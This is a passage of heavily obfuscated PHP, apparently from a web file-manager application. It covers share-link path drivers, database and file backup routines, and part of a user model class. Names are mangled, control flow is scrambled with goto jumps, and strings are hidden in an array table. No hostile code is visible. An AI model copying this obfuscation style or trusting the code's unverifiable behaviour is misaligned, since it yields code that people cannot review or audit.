copy($BÖĞ™˜¤Ö±, $BÃ‰¦Š„½‚, $D³¥İÚºÎï = false) { return $this->copyMove($BÖĞ™˜¤Ö±, $BÃ‰¦Š„½‚, $D³¥İÚºÎï, $_SERVER[ç][513]); } public function move($B‹Í˜óÒâ, $D×’Ïæâ, $D¿„Êä¿ˆ× = false) { return $this->copyMove($B‹Í˜óÒâ, $D×’Ïæâ, $D¿„Êä¿ˆ×, $_SERVER[ç][515]); } private function copyMove($fØõ…¾àÇ, $DÖßŸÜ†‚, $Dä¥ÕâÁ®ë, $CñÈÅ­ôë) { goto AĞ‘›³µø§; F¯Çƒ–Üà: if ($C‹Õ¤ÌÒ->pathParse[$a¿‘”ÉÓŠš[1015]]) { $DÖßŸÜ†‚ = $C‹Õ¤ÌÒ->pathParse[$a¿‘”ÉÓŠš[1015]]; } else { $DÖßŸÜ†‚ = $dË¢Îöí°ƒ; } $fÎ‹óô—ß¼ = IO::copyMove($fØõ…¾àÇ, $DÖßŸÜ†‚, $Dä¥ÕâÁ®ë, $CñÈÅ­ôë); $fÎ‹óô—ß¼ = $this->getPathOuter($fÎ‹óô—ß¼); goto C†ãœ“ê”Š; AĞ‘›³µø§: $a¿‘”ÉÓŠš =& $_SERVER[ç]; $dË¢Îöí°ƒ = $DÖßŸÜ†‚; $C‹Õ¤ÌÒ = IO::driverMake($DÖßŸÜ†‚); goto F¯Çƒ–Üà; C†ãœ“ê”Š: return $fÎ‹óô—ß¼; goto eœĞæœ™¥Ğ; eœĞæœ™¥Ğ: } public function pathThis($BéÆÛàñ¨Ÿ) { return get_path_this($this->pathParse[$_SERVER[ç][75]]); } public function pathFather($dë®È¸¬Œ¤) { return get_path_father($this->pathParse[$_SERVER[ç][75]]); } public function iconvSystem($F®¶ĞŞÀ•) { return $F®¶ĞŞÀ•; } protected function infoParse($D“ƒ¯×ã‡Á, $båÎïæÚõØ = false) { $D˜âëËƒÜ =& $_SERVER[ç]; $C•³¿ï’Ãë = $this->pathParse[$D˜âëËƒÜ[460]][$D˜âëËƒÜ[1038]] . $this->pathParse[$D˜âëËƒÜ[1031]]; if ($båÎïæÚõØ) { $BÑ‚”²ÊãÉ = IO::infoWithChildren($C•³¿ï’Ãë); } else { $BÑ‚”²ÊãÉ = IO::info($C•³¿ï’Ãë); } $C·ÜëçÑùŸ = $this->pathParse[$D˜âëËƒÜ[460]]; return Action($D˜âëËƒÜ[1178])->_shareItemeParse($BÑ‚”²ÊãÉ, $C·ÜëçÑùŸ); } public function listAll($DˆËåœØ…õ) { $E•õµÇ =& $_SERVER[ç]; $aÀîé‘ìù÷ = IO::listAll($DˆËåœØ…õ); $d±ˆÖÛö† = $this->pathParse[$E•õµÇ[460]]; foreach ($aÀîé‘ìù÷ as &$d°†´Ã¶×Ê) { check_abort(); $d°†´Ã¶×Ê = array_merge(IO::info($d°†´Ã¶×Ê[$E•õµÇ[75]]), $d°†´Ã¶×Ê); $d°†´Ã¶×Ê[$E•õµÇ[84]] = Action($E•õµÇ[1178])->_shareItemeParse($d°†´Ã¶×Ê, $d±ˆÖÛö†); } unset($d°†´Ã¶×Ê); return $aÀîé‘ìù÷; } public function getPathOuter($E³±¿¶Ï) { goto d£öƒğŞî; d£öƒğŞî: $AˆİõØ¯ßô =& $_SERVER[ç]; $Eâ•ùò•Ÿö = KodIO::parse($E³±¿¶Ï); if ($Eâ•ùò•Ÿö[$AˆİõØ¯ßô[29]] == KodIO::KOD_SHARE_ITEM) { return $Eâ•ùò•Ÿö[$AˆİõØ¯ßô[75]]; } goto cÙİ†®ÍÓ; cÙİ†®ÍÓ: $fÀÆà‡ù‡¸ = KodIO::clear($E³±¿¶Ï); $fÖàÜàÍªµ = KodIO::clear($this->pathParse[$AˆİõØ¯ßô[460]][$AˆİõØ¯ßô[1038]]); $Cù‚ÂÆ„†— = substr($fÀÆà‡ù‡¸, strlen($fÖàÜàÍªµ)); goto b±î¢ÔÏêã; b±î¢ÔÏêã: if (substr($fÀÆà‡ù‡¸, 0, strlen($fÖàÜàÍªµ)) != $fÖàÜàÍªµ) { return !1; } return $this->pathParse[$AˆİõØ¯ßô[1032]] . $AˆİõØ¯ßô[8] . ltrim($Cù‚ÂÆ„†—, $AˆİõØ¯ßô[8]); goto fËÒ÷²î†´; fËÒ÷²î†´: } public function getType() { $CØŞô‰›‚² =& $_SERVER[ç]; $b”İ¢ˆÖ´Ù = str_replace($CØŞô‰›‚²[71], $CØŞô‰›‚²[33], get_class($this)); return strtolower($b”İ¢ˆÖ´Ù); } public function isTypeObject($f—™ï§ÅÏ©) { return IO::isTypeObject($f—™ï§ÅÏ©); } public function info($d™ƒ…‚—Û¥) { return $this->infoParse($d™ƒ…‚—Û¥); } public function infoAuth($Dİ—¿§Õé§) { return $this->infoParse($Dİ—¿§Õé§); } public function infoWithChildren($d¯¡²Ç‰í) { return $this->infoParse($d¯¡²Ç‰í, !0); } public function infoFull($D‰ËÂŸ ) { return $this->infoParse($D‰ËÂŸ ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cÉ¯¾çÂÔ¸) { $this->pathParse = $cÉ¯¾çÂÔ¸; } protected function infoParse($EæÏœÇñ¡, $DºŒË‚Ğ‡í = false) { $C¾ˆÏ„‰Âß =& $_SERVER[ç]; return Action($C¾ˆÏ„‰Âß[1037])->sharePathInfo($this->pathParse[$C¾ˆÏ„‰Âß[75]], !0, $DºŒË‚Ğ‡í); } public function listPath($F›öÓ­ŒÄÌ, $BôÔÑ‰ŠÛÆ = false) { $aÁ—´ºÀ‚Ä =& $_SERVER[ç]; $c´ŠŒøóå‚ = IO::listPath($F›öÓ­ŒÄÌ, $BôÔÑ‰ŠÛÆ); foreach ($c´ŠŒøóå‚ as $B·Â›…‚— => $dºŞš¹¨ŒÂ) { if (!in_array($B·Â›…‚—, array($aÁ—´ºÀ‚Ä[73], $aÁ—´ºÀ‚Ä[74]))) { continue; } foreach ($dºŞš¹¨ŒÂ as $E‚ñ×“ƒÅ => $f„—¦¨ô“æ) { $f„—¦¨ô“æ = Action($aÁ—´ºÀ‚Ä[1187])->parsePathChildren($f„—¦¨ô“æ, array($aÁ—´ºÀ‚Ä[408] => $F›öÓ­ŒÄÌ)); $c´ŠŒøóå‚[$B·Â›…‚—][$E‚ñ×“ƒÅ] = Action($aÁ—´ºÀ‚Ä[1037])->shareItemInfo($f„—¦¨ô“æ); } } return $c´ŠŒøóå‚; } public function listAll($d½‚‚Â…µ) { $AÉ’™™âÉ… =& $_SERVER[ç]; $bˆŸ¹›‹Ãñ = IO::listAll($d½‚‚Â…µ); foreach ($bˆŸ¹›‹Ãñ as &$cÆàˆ«ëÓ) { $cÆàˆ«ëÓ = array_merge(IO::info($cÆàˆ«ëÓ[$AÉ’™™âÉ…[75]]), $cÆàˆ«ëÓ); $cÆàˆ«ëÓ[$AÉ’™™âÉ…[84]] = Action($AÉ’™™âÉ…[1037])->shareItemInfo($cÆàˆ«ëÓ); } unset($cÆàˆ«ëÓ); return $bˆŸ¹›‹Ãñ; } } goto A¼é…ÀâÇ; dàì¸„—‡: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Dã÷Ïš¼; D«ÅáŞãœÒ: self::$name = $d…Ìµ¼ø¨[$eÔÔÆÂ•‰Ä[28]]; $fôš­ˆĞÔ = $GLOBALS[$eÔÔÆÂ•‰Ä[6]][$eÔÔÆÂ•‰Ä[17]]; $E›‰Ã¸²°  = $this->_dbType($fôš­ˆĞÔ); goto AµÊ“»‡à; eó¤œ±…: foreach ($f§Â…ƒ× as $E»Á‡â‚Ù¯) { $eÚô³Şğ¤ = $e‘‰ŸÃŒ . $E»Á‡â‚Ù¯ . $eÔÔÆÂ•‰Ä[723]; $cÕÄ·›Å½ = null; if ($E»Á‡â‚Ù¯ == $eÔÔÆÂ•‰Ä[724] && (!isset($d…Ìµ¼ø¨[$eÔÔÆÂ•‰Ä[698]]) || $d…Ìµ¼ø¨[$eÔÔÆÂ•‰Ä[698]] == $eÔÔÆÂ•‰Ä[491])) { $cÕÄ·›Å½ = self::$io; } $Bà¬àÖ©Š += $CÍƒ‡à¢­Ø->sqlFromDb($E»Á‡â‚Ù¯, $eÚô³Şğ¤, $D¨²¬Éø­¶, $cÕÄ·›Å½); } if (isset($D¨²¬Éø­¶->task[$eÔÔÆÂ•‰Ä[725]])) { $C³ ‹ªÕ®õ = $D¨²¬Éø­¶->task[$eÔÔÆÂ•‰Ä[725]] ? $D¨²¬Éø­¶->task[$eÔÔÆÂ•‰Ä[725]] : timeFloat(); $EÚõêĞ¬Ê = $C³ ‹ªÕ®õ - $D¨²¬Éø­¶->task[$eÔÔÆÂ•‰Ä[726]]; if ($EÚõêĞ¬Ê >= 0.2) { $EÔóŠÅ‘“­ += 1; } } $D¨²¬Éø­¶->end(); goto D˜Ñå‹Ò×›; D¾İÍ®©ö: return !0; goto C×ØÃæ³½—; Dã÷Ïš¼: $eÔÔÆÂ•‰Ä =& $_SERVER[ç]; $d…Ìµ¼ø¨ = Backup::get(); self::$io = $d…Ìµ¼ø¨[$eÔÔÆÂ•‰Ä[697]]; goto D«ÅáŞãœÒ; D‘ÆŒ¥ìÇ : mk_dir($e‘‰ŸÃŒ); $EÔóŠÅ‘“­ = $Bà¬àÖ©Š = 0; try { $f§Â…ƒ× = $CÍƒ‡à¢­Ø->db()->getTables(); } catch (Exception $Cï÷Ï¾Ôè±) { return !1; } goto E­„¤ºóº; D˜Ñå‹Ò×›: $CÛ÷ò´Éº´ = array($eÔÔÆÂ•‰Ä[727] => $E›‰Ã¸²° , $eÔÔÆÂ•‰Ä[712] => 1, $eÔÔÆÂ•‰Ä[728] => $EÔóŠÅ‘“­, $eÔÔÆÂ•‰Ä[729] => $Bà¬àÖ©Š); Backup::set($CÛ÷ò´Éº´); if ($EÔóŠÅ‘“­ > $Bà¬àÖ©Š) { return !1; } goto D¾İÍ®©ö; AµÊ“»‡à: $CÍƒ‡à¢­Ø = new DbManage($fôš­ˆĞÔ, $E›‰Ã¸²° ); $e‘‰ŸÃŒ = TEMP_FILES . $eÔÔÆÂ•‰Ä[715] . self::$name . $eÔÔÆÂ•‰Ä[8]; del_dir($e‘‰ŸÃŒ); goto D‘ÆŒ¥ìÇ ; E­„¤ºóº: $f§Â…ƒ× = array_diff($f§Â…ƒ×, array($eÔÔÆÂ•‰Ä[716], $eÔÔÆÂ•‰Ä[717])); foreach ($f§Â…ƒ× as $E»Á‡â‚Ù¯) { $EÔóŠÅ‘“­ += $CÍƒ‡à¢­Ø->model($E»Á‡â‚Ù¯)->count(); } $D¨²¬Éø­¶ = new Task($eÔÔÆÂ•‰Ä[718], $eÔÔÆÂ•‰Ä[719], $EÔóŠÅ‘“­, LNG($eÔÔÆÂ•‰Ä[720]) . $eÔÔÆÂ•‰Ä[721] . LNG($eÔÔÆÂ•‰Ä[722])); goto eó¤œ±…; C×ØÃæ³½—: } private function _dbType($F‚ôÓÍ¦ší) { goto FóÇ°Ç®êÙ; bêŞ‘öŠÆÀ: if ($FÁ‹Î„ö‹§ == $e‰İˆ‚©³[731]) { $Aß”Ë½°Â = explode($e‰İˆ‚©³[4], $F‚ôÓÍ¦ší[$e‰İˆ‚©³[732]]); $FÁ‹Î„ö‹§ = $Aß”Ë½°Â[0]; } $dÄÅíÍ“Ğ = array($e‰İˆ‚©³[733] => $e‰İˆ‚©³[9], $e‰İˆ‚©³[734] => $e‰İˆ‚©³[735]); if (isset($dÄÅíÍ“Ğ[$FÁ‹Î„ö‹§])) { $FÁ‹Î„ö‹§ = $dÄÅíÍ“Ğ[$FÁ‹Î„ö‹§]; } goto b¸¡‘ÀòŸ§; FóÇ°Ç®êÙ: $e‰İˆ‚©³ =& $_SERVER[ç]; $F‚ôÓÍ¦ší = array_change_key_case($F‚ôÓÍ¦ší); $FÁ‹Î„ö‹§ = $F‚ôÓÍ¦ší[$e‰İˆ‚©³[730]]; goto bêŞ‘öŠÆÀ; b¸¡‘ÀòŸ§: return $FÁ‹Î„ö‹§; goto c´¦é’“’; c´¦é’“’: } } class BackupDbFile { public function __construct() { } public function index() { goto F“ßÚ½Æä‚; AØáÁ¹Ì¹˜: $E×¬…’÷Æ› = TEMP_FILES . "\142\x61\143\153\165\160\x5f{$F¶»Ûè«±²}\x2f"; $D¯´Âİó = "\x7b\x69\x6f\x3a{$AôÔ¦è« [$DÃóˆ»“Ì·[697]]}\x7d\57\x64\141\164\141\x62\x61\163\145\57\x62\x61\143\153\x75\160\137{$F¶»Ûè«±²}\x2f"; if (!($D¯´Âİó = IO::mkdir($D¯´Âİó))) { return !1; } goto aùéáÅØç; aùéáÅØç: $dËâ…ÚÊ = IO::listPath($E×¬…’÷Æ›); $aÛ”«¸ñÙ¢ = isset($dËâ…ÚÊ[$DÃóˆ»“Ì·[73]]) ? $dËâ…ÚÊ[$DÃóˆ»“Ì·[73]] : array(); $cñô¨Ï—Œâ = array_sum(array_column($aÛ”«¸ñÙ¢, $DÃóˆ»“Ì·[77])); goto A–Èâ½‚‚É; DšË¾ùÆ×Š: $bÊ‡åÙ¹ö“->task[$DÃóˆ»“Ì·[704]] = $cñô¨Ï—Œâ; foreach ($dËâ…ÚÊ[$DÃóˆ»“Ì·[73]] as $eå¼à‹Ö¢) { $fŒİÕ æ = IO::move($eå¼à‹Ö¢[$DÃóˆ»“Ì·[75]], $D¯´Âİó); if (!$fŒİÕ æ) { $bÊ‡åÙ¹ö“->end(); $AÀëŠªÎš = IO::getLastError($DÃóˆ»“Ì·[739] . $eå¼à‹Ö¢[$DÃóˆ»“Ì·[75]] . $DÃóˆ»“Ì·[740] . $D¯´Âİó . $DÃóˆ»“Ì·[499]); write_log($AÀëŠªÎš, $DÃóˆ»“Ì·[719]); return !1; } } $Fè´òòƒ§ = CONTROLLER_DIR . $DÃóˆ»“Ì·[741]; goto D°‘ÃáˆâÒ; F“ßÚ½Æä‚: $DÃóˆ»“Ì· =& $_SERVER[ç]; $AôÔ¦è«  = Backup::get(); $F¶»Ûè«±² = $AôÔ¦è« [$DÃóˆ»“Ì·[28]]; goto AØáÁ¹Ì¹˜; D°‘ÃáˆâÒ: $AÊ–å×àÈ = CONTROLLER_DIR . $DÃóˆ»“Ì·[742]; IO::copy($Fè´òòƒ§, $D¯´Âİó); IO::copy($AÊ–å×àÈ, $D¯´Âİó); goto E¿óîÖ³°; E¿óîÖ³°: $bÊ‡åÙ¹ö“->end(); Backup::set(array($DÃóˆ»“Ì·[743] => $cñô¨Ï—Œâ)); return !0; goto dÏÎ›¥Š÷; A–Èâ½‚‚É: if (!$cñô¨Ï—Œâ) { return !1; } Backup::set(array($DÃóˆ»“Ì·[736] => $cñô¨Ï—Œâ)); $bÊ‡åÙ¹ö“ = new TaskFileTransfer($DÃóˆ»“Ì·[737], $DÃóˆ»“Ì·[719], count($aÛ”«¸ñÙ¢), LNG($DÃóˆ»“Ì·[720]) . $DÃóˆ»“Ì·[434] . LNG($DÃóˆ»“Ì·[722]) . $DÃóˆ»“Ì·[738]); goto DšË¾ùÆ×Š; dÏÎ›¥Š÷: } } class BackupFile { public function __construct() { } public function index() { goto AÀ±˜ÔŠ•; Cìíğğİ°æ: $AŞÛ†å•êŠ = !0; $AöŒ‰§ùÒ’ = $this->storeIds(); $Bƒ‘–Šæİ‰ = 1; goto E˜¥£ÍÙŒ‘; E˜¥£ÍÙŒ‘: $c¨æ›ö…ê = 1000; $fÇ¡¯Çóö = $bÀéÑºŸ½¨ = 0; $cĞÎ½Äœˆ = array(); goto aé‰Æ°…á; EÂ¦Â©”„„: $A´¨Ï†Şôô = array($_SERVER[ç][759] => 1, $_SERVER[ç][470] => time(), $_SERVER[ç][714] => 1, $_SERVER[ç][756] => $eÑ‘îÔì¥á, $_SERVER[ç][749] => $Cùˆ¯âš÷å, $_SERVER[ç][748] => $C§ñ‚•º—ß); if ($bÀéÑºŸ½¨) { $A´¨Ï†Şôô[$_SERVER[ç][757]] = $eÌÎ“Ü‚£„; $A´¨Ï†Şôô[$_SERVER[ç][758]] = $c†ÇÏ¬¶©; } Backup::set($A´¨Ï†Şôô); goto dÙƒœºøé ; dÙƒœºøé : $this->_fileFilter($cĞÎ½Äœˆ); return !0; goto C§ˆ‹ãè«; Eõæ«¢ô‰Ç: $C§ñ‚•º—ß = (int) Model($_SERVER[ç][724])->where($cî´®ôøÎ)->count($_SERVER[ç][441]); $Cùˆ¯âš÷å = (int) Model($_SERVER[ç][724])->where($cî´®ôøÎ)->sum($_SERVER[ç][77]); $B¹ô®±ïî‰ = new TaskFileTransfer($_SERVER[ç][746], $_SERVER[ç][719], $C§ñ‚•º—ß, LNG($_SERVER[ç][720]) . $_SERVER[ç][721] . LNG($_SERVER[ç][747])); goto e˜¨–’…; aé‰Æ°…á: $c†ÇÏ¬¶© = $eÌÎ“Ü‚£„ = 0; do { $BÜÂµ¨±Š¹ = $_SERVER[ç][750]; $FËóïæõÂÂ = Model($_SERVER[ç][724])->where($cî´®ôøÎ)->field($BÜÂµ¨±Š¹)->order($_SERVER[ç][751])->selectPage($c¨æ›ö…ê, $Bƒ‘–Šæİ‰); $B£Ì²‚™¨ = !empty($FËóïæõÂÂ[$_SERVER[ç][365]]) ? $FËóïæõÂÂ[$_SERVER[ç][365]] : array(); foreach ($B£Ì²‚™¨ as $bòê¬±²ºÅ) { goto eİñ×Ì³Â; eİñ×Ì³Â: if (!$this->_fileExist($bòê¬±²ºÅ, $cĞÎ½Äœˆ, $AöŒ‰§ùÒ’)) { $C§ñ‚•º—ß -= 1; $Cùˆ¯âš÷å -= (int) $bòê¬±²ºÅ[$_SERVER[ç][77]]; write_log("\146\x69\154\145\x20\x6e\x6f\164\40\x65\x78\x69\163\x74\56\x66\x69\154\x65\111\x44\72{$bòê¬±²ºÅ[$_SERVER[ç][441]]}\x2c\40\x70\x61\164\x68\x3a{$bòê¬±²ºÅ[$_SERVER[ç][75]]}", $_SERVER[ç][752]); continue; } $BŒ»âÁ‘Ê = $bòê¬±²ºÅ[$_SERVER[ç][75]]; $E¤Ğ«Á¦Ì× = "\173\151\157\x3a{$F«Ô„„Š ’[$_SERVER[ç][697]]}\175" . substr($BŒ»âÁ‘Ê, strlen("\x7b\151\157\x3a{$bòê¬±²ºÅ[$_SERVER[ç][753]]}\175")); goto cë—Ïá¸ôÀ; BÊ½Ô÷Ê´: if ($fÇ¡¯Çóö >= 1024 * 1024 * 100) { $A´¨Ï†Şôô = array($_SERVER[ç][756] => $eÑ‘îÔì¥á, $_SERVER[ç][757] => $eÌÎ“Ü‚£„, $_SERVER[ç][758] => $c†ÇÏ¬¶©); Backup::set($A´¨Ï†Şôô); $fÇ¡¯Çóö = $bÀéÑºŸ½¨ = 0; } goto BŠù…§§ëÒ; Dò¢˜Ü«–ê: $fÇ¡¯Çóö += $bòê¬±²ºÅ[$_SERVER[ç][77]]; $eÌÎ“Ü‚£„ += 1; $c†ÇÏ¬¶© += $bòê¬±²ºÅ[$_SERVER[ç][77]]; goto BÊ½Ô÷Ê´; cë—Ïá¸ôÀ: if (IO::exist($E¤Ğ«Á¦Ì×)) { $B¹ô®±ïî‰->updateFileEnd($bòê¬±²ºÅ[$_SERVER[ç][28]], $bòê¬±²ºÅ[$_SERVER[ç][77]]); } else { $E¤Ğ«Á¦Ì× = get_path_father($E¤Ğ«Á¦Ì×); IO::mkdir($E¤Ğ«Á¦Ì×); if (!IO::copy($BŒ»âÁ‘Ê, $E¤Ğ«Á¦Ì×, $_SERVER[ç][754])) { write_log($_SERVER[ç][755] . $BŒ»âÁ‘Ê . $_SERVER[ç][740] . $E¤Ğ«Á¦Ì× . $_SERVER[ç][499], $_SERVER[ç][719]); $AŞÛ†å•êŠ = !1; break; } } $eÑ‘îÔì¥á = $bòê¬±²ºÅ[$_SERVER[ç][441]]; $bÀéÑºŸ½¨ += 1; goto Dò¢˜Ü«–ê; BŠù…§§ëÒ: } $Fò‚’İ‹…ß = count($B£Ì²‚™¨); $Bƒ‘–Šæİ‰++; } while ($Fò‚’İ‹…ß == $c¨æ›ö…ê); $B¹ô®±ïî‰->end(); goto EÂ¦Â©”„„; AÀ±˜ÔŠ•: $F«Ô„„Š ’ = Backup::get(); $eÑ‘îÔì¥á = $F«Ô„„Š ’[$_SERVER[ç][289]][$_SERVER[ç][173]][$_SERVER[ç][441]]; $cî´®ôøÎ = array($_SERVER[ç][442] => array($_SERVER[ç][744], $eÑ‘îÔì¥á), $_SERVER[ç][745] => array($_SERVER[ç][327], $F«Ô„„Š ’[$_SERVER[ç][697]])); goto Eõæ«¢ô‰Ç; e˜¨–’…: $B¹ô®±ïî‰->task[$_SERVER[ç][704]] = $Cùˆ¯âš÷å; $A´¨Ï†Şôô = array($_SERVER[ç][748] => $C§ñ‚•º—ß, $_SERVER[ç][749] => $Cùˆ¯âš÷å); Backup::set($A´¨Ï†Şôô); goto Cìíğğİ°æ; C§ˆ‹ãè«: } private function _fileExist($Fçíõ¢ª‘, &$B‚®•¨÷Ë, $cÆ‹—‹‹ ¡) { goto EĞßÊÙêÛà; EĞßÊÙêÛà: $AçÀØñó¶Ÿ =& $_SERVER[ç]; $B¬ÔÛŠàÍˆ = $Fçíõ¢ª‘[$AçÀØñó¶Ÿ[75]]; if (in_array($Fçíõ¢ª‘[$AçÀØñó¶Ÿ[441]], $B‚®•¨÷Ë)) { return !1; } goto EÚ‹ÍÅ’È; dò²¢ÀÒ´Ú: $B‚®•¨÷Ë = array_merge($B‚®•¨÷Ë, array_to_keyvalue($b©÷ƒäßñ¢, $AçÀØñó¶Ÿ[33], $AçÀØñó¶Ÿ[441])); return !1; goto EÓ„‚ÚÅÃ·; Eªá®æÀ¡: if (IO::exist($eµìÛÀÖˆ²)) { $B‚®•¨÷Ë[] = $Fçíõ¢ª‘[$AçÀØñó¶Ÿ[441]]; return !1; } $cŒÄ‘ªÃá = array($AçÀØñó¶Ÿ[753] => $Fçíõ¢ª‘[$AçÀØñó¶Ÿ[753]], $AçÀØñó¶Ÿ[75] => array($AçÀØñó¶Ÿ[378], "{$eµìÛÀÖˆ²}\x25")); $b©÷ƒäßñ¢ = Model($AçÀØñó¶Ÿ[724])->where($cŒÄ‘ªÃá)->field($AçÀØñó¶Ÿ[442])->select(); goto dò²¢ÀÒ´Ú; EÚ‹ÍÅ’È: if (!in_array($Fçíõ¢ª‘[$AçÀØñó¶Ÿ[753]], $cÆ‹—‹‹ ¡)) { return !1; } if (IO::exist($B¬ÔÛŠàÍˆ)) { return !0; } $eµìÛÀÖˆ² = get_path_father($B¬ÔÛŠàÍˆ); goto Eªá®æÀ¡; EÓ„‚ÚÅÃ·: } private function _fileFilter($eòõŒ¯¦ö) { $FòÖ›Æô×Ó =& $_SERVER[ç]; if (empty($eòõŒ¯¦ö)) { return; } $eĞ›çÊÂ®º = array($FòÖ›Æô×Ó[441] => array($FòÖ›Æô×Ó[7], array_unique($eòõŒ¯¦ö))); $AòïÉ•°®¹ = Model($FòÖ›Æô×Ó[760])->where($eĞ›çÊÂ®º)->field($FòÖ›Æô×Ó[390])->select(); foreach ($AòïÉ•°®¹ as $cÇˆÖš†Š ) { Model($FòÖ›Æô×Ó[760])->remove($cÇˆÖš†Š [$FòÖ›Æô×Ó[390]], !1); } } private function storeIds() { $bÇ¸ğ›áÜö =& $_SERVER[ç]; $f®ØÂ¬Ñ = Model($bÇ¸ğ›áÜö[709])->listData(); $CŒ²éù§‘ = array(); $FÛ˜¡Ü·Û = $GLOBALS[$bÇ¸ğ›áÜö[6]][$bÇ¸ğ›áÜö[87]][$bÇ¸ğ›áÜö[761]]; foreach ($f®ØÂ¬Ñ as $A—ÑÆîì«º) { $føİŒ¡±”Ñ = strtolower($A—ÑÆîì«º[$bÇ¸ğ›áÜö[93]]); if (!isset($FÛ˜¡Ü·Û[$føİŒ¡±”Ñ])) { continue; } $dĞÈ—ÊãÆï = $bÇ¸ğ›áÜö[71] . (isset($FÛ˜¡Ü·Û[$føİŒ¡±”Ñ]) ? $FÛ˜¡Ü·Û[$føİŒ¡±”Ñ] : ucfirst($føİŒ¡±”Ñ)); if (!class_exists($dĞÈ—ÊãÆï)) { continue; } $CŒ²éù§‘[] = $A—ÑÆîì«º[$bÇ¸ğ›áÜö[388]]; } return $CŒ²éù§‘; } } goto E­åø¤Í; eÇóÔã“ªï: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\x65" => "\165\163\x65\x72\x5f\x6d\145\164\141", "\155\145\164\x61\x46\x69\145\x6c\144" => "\x75\x73\x65\162\111\x44"); protected $simpleField = "\165\163\x65\162\x49\104\54\156\151\143\153\x4e\141\155\x65\x2c\x6e\141\x6d\x65\54\141\x76\x61\x74\141\x72\54\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d¸Ë„Šò§ø) { $aÆÀÁÒ¤˜ =& $_SERVER[ç]; $D´Èí°Ãñé = $aÆÀÁÒ¤˜[2076]; return array($aÆÀÁÒ¤˜[1725] => array($d¸Ë„Šò§ø[0], $D´Èí°Ãñé), $aÆÀÁÒ¤˜[1727] => array($d¸Ë„Šò§ø[0], $D´Èí°Ãñé), $aÆÀÁÒ¤˜[2077] => array($d¸Ë„Šò§ø[0], $D´Èí°Ãñé)); } protected function getInfo($AÔÜ»¥À•¢, $a­âÄì‚»² = false) { $DÆ®¥ŒÄŒß = $this->getInfoSimple($AÔÜ»¥À•¢); if (!is_array($DÆ®¥ŒÄŒß)) { return array(); } if ($a­âÄì‚»²) { return $this->_getInfoApply($DÆ®¥ŒÄŒß); } return $this->cacheFunctionGet($_SERVER[ç][1734], $AÔÜ»¥À•¢); } protected function getInfoFull($eÕ÷Ê¨¯„“, $AİÍµ˜éò‘ = false) { $cÖïšÊ«ˆ = $this->getInfoSimple($eÕ÷Ê¨¯„“); if (!is_array($cÖïšÊ«ˆ)) { return array(); } if ($AİÍµ˜éò‘) { return $this->_getInfoApply($cÖïšÊ«ˆ, !0); return $this->_getInfoApply($cÖïšÊ«ˆ, !0); } return $this->cacheFunctionGet($_SERVER[ç][2078], $eÕ÷Ê¨¯„“); } private function _getInfoApply($b³‡ËÛØÚ, $cš¢ƒ¶« = false) { goto D¾íìÅ…; aåá®¬õ¤: $b³‡ËÛØÚ = $this->_listDataApplyItem($b³‡ËÛØÚ); $dãÕï‚ñ™” = Model($bÜ¹´¥öî‘[1171])->metaGet($b³‡ËÛØÚ[$bÜ¹´¥öî‘[84]][$bÜ¹´¥öî‘[390]]); $b³‡ËÛØÚ[$bÜ¹´¥öî‘[2081]] = $E‘ôà°ç§è; goto fÀò„‰Áš; fÀò„‰Áš: $b³‡ËÛØÚ[$bÜ¹´¥öî‘[84]][$bÜ¹´¥öî‘[1914]] = isset($dãÕï‚ñ™”[$bÜ¹´¥öî‘[1915]]) ? $dãÕï‚ñ™”[$bÜ¹´¥öî‘[1915]] : null; if ($cš¢ƒ¶«) { $b³‡ËÛØÚ[$bÜ¹´¥öî‘[439]] = $this->metaGet($b³‡ËÛØÚ[$bÜ¹´¥öî‘[1491]]); } return $b³‡ËÛØÚ; goto eª×¸Æé¼ğ; D¾íìÅ…: $bÜ¹´¥öî‘ =& $_SERVER[ç]; if (!$b³‡ËÛØÚ) { return $b³‡ËÛØÚ; } $E‘ôà°ç§è = md5($bÜ¹´¥öî‘[2079] . $b³‡ËÛØÚ[$bÜ¹´¥öî‘[817]] . $bÜ¹´¥öî‘[2080] . $b³‡ËÛØÚ[$bÜ¹´¥öî‘[28]]); goto aåá®¬õ¤; eª×¸Æé¼ğ: } protected function getInfoSimple($f¾ÜËÁ¤–, $CäÆ°òÉß = false) { $F‹¹Úµ¢Â =& $_SERVER[ç]; if (!$f¾ÜËÁ¤–) { return array(); } if ($CäÆ°òÉß) { $BÔÛ½ôˆÀÃ = $this->where(array($F‹¹Úµ¢Â[1491] => intval($f¾ÜËÁ¤–)))->find(); if (!is_array($BÔÛ½ôˆÀÃ)) { return array(); } $BÔÛ½ôˆÀÃ[$F‹¹Úµ¢Â[2082]] = Action($F‹¹Úµ¢Â[2083])->parseUrl($BÔÛ½ôˆÀÃ[$F‹¹Úµ¢Â[2082]]); return $BÔÛ½ôˆÀÃ; } return $this->cacheFunctionGet($F‹¹Úµ¢Â[1728], $f¾ÜËÁ¤–); } protected function getInfoSimpleOuter($bÓ‡Şî°º) { goto DÔ…˜®ùã–; eÒ™¿§÷çÇ: $A¦¤ËöÁ™µ = array_field_key($Cáçâ‰ÌÖ¶, explode($aÑŠö’ËÒ¾[47], $this->simpleField)); if (!$A¦¤ËöÁ™µ) { return array($aÑŠö’ËÒ¾[1491] => $aÑŠö’ËÒ¾[1052], $aÑŠö’ËÒ¾[28] => $aÑŠö’ËÒ¾[159] . LNG($aÑŠö’ËÒ¾[2086]) . $aÑŠö’ËÒ¾[499], $aÑŠö’ËÒ¾[2082] => STATIC_PATH . $aÑŠö’ËÒ¾[2087]); } $A¦¤ËöÁ™µ[$aÑŠö’ËÒ¾[2082]] = Action($aÑŠö’ËÒ¾[2083])->parseUrl($A¦¤ËöÁ™µ[$aÑŠö’ËÒ¾[2082]]); goto fŸ£«ß ‰»; fŸ£«ß ‰»: return $A¦¤ËöÁ™µ; goto d¸ŠšŞï°; DÔ…˜®ùã–: $aÑŠö’ËÒ¾ =& $_SERVER[ç]; if (!$bÓ‡Şî°º || $bÓ‡Şî°º == 0) { return 